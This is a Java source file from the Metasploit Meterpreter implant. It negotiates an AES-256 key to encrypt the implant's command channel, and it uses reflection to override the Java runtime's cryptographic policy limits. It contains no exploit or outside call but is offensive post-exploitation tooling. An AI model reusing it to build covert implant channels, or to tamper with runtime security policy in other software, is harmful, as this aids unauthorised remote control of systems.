package com.metasploit.meterpreter.core;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.spec.X509EncodedKeySpec;
import java.util.Map;
import javax.crypto.Cipher;

import com.metasploit.meterpreter.Transport;
import com.metasploit.meterpreter.Meterpreter;
import com.metasploit.meterpreter.TLVPacket;
import com.metasploit.meterpreter.TLVType;
import com.metasploit.meterpreter.command.Command;

public class core_negotiate_tlv_encryption implements Command {

    private static final SecureRandom sr = new SecureRandom();

    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
        if (!fixKeyLength()) {
            return ERROR_FAILURE;
        }

        byte[] der = request.getRawValue(TLVType.TLV_TYPE_RSA_PUB_KEY);
        byte[] aesKey = new byte[32];
        sr.nextBytes(aesKey);

        try
        {
            PublicKey pubKey = getPublicKey(der);
            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.ENCRYPT_MODE, pubKey);
            response.add(TLVType.TLV_TYPE_ENC_SYM_KEY, cipher.doFinal(aesKey));
        }
        catch(Exception e)
        {
            response.add(TLVType.TLV_TYPE_SYM_KEY, aesKey);
        }
        response.add(TLVType.TLV_TYPE_SYM_KEY_TYPE, Transport.ENC_AES256);

        meterpreter.getTransports().current().setAesEncryptionKey(aesKey);

        return ERROR_SUCCESS;
    }

    private static boolean fixKeyLength() {
        int newMaxKeyLength;
        try {
            if ((newMaxKeyLength = Cipher.getMaxAllowedKeyLength("AES")) < 256) {
                Class c = Class.forName("javax.crypto.CryptoAllPermissionCollection");
                Constructor con = c.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissionCollection = con.newInstance();
                Field f = c.getDeclaredField("all_allowed");
                f.setAccessible(true);
                f.setBoolean(allPermissionCollection, true);

                c = Class.forName("javax.crypto.CryptoPermissions");
                con = c.getDeclaredConstructor();
                con.setAccessible(true);
                Object allPermissions = con.newInstance();
                f = c.getDeclaredField("perms");
                f.setAccessible(true);
                ((Map) f.get(allPermissions)).put("*", allPermissionCollection);

                c = Class.forName("javax.crypto.JceSecurityManager");
                f = c.getDeclaredField("defaultPolicy");
                f.setAccessible(true);
                Field mf = Field.class.getDeclaredField("modifiers");
                mf.setAccessible(true);
                mf.setInt(f, f.getModifiers() & ~Modifier.FINAL);
                f.set(null, allPermissions);

                newMaxKeyLength = Cipher.getMaxAllowedKeyLength("AES");
            }
        } catch (Exception e) {
            return false;
        }
        if (newMaxKeyLength < 256)
            return false;
        return true;
    }

    private PublicKey getPublicKey(byte[] der) {
        try
        {
            X509EncodedKeySpec spec = new X509EncodedKeySpec(der);
            return KeyFactory.getInstance("RSA").generatePublic(spec);
        }
        catch(Exception e)
        {
            return null;
        }
    }
}
